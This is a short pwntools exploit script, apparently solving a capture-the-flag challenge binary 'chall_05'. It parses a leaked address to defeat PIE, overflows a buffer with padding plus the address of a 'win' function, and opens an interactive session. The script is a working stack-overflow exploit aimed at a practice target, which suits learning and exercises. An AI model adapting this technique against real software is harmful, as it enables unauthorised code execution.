from pwn import *
p=process("./chall_05")
elf=ELF("./chall_05")
p.recvline()
string = p.recvline()
import re
leak = re.findall(b"(0x[0-9a-f]{4,16})",string)[0]
leak = int(leak,16)
main = 0x011c0
elf.address = leak - main
winaddr = elf.sym.win
payload = b"A"*(0x60 - 0x8) + p64(winaddr)
p.sendline(payload)
p.interactive()
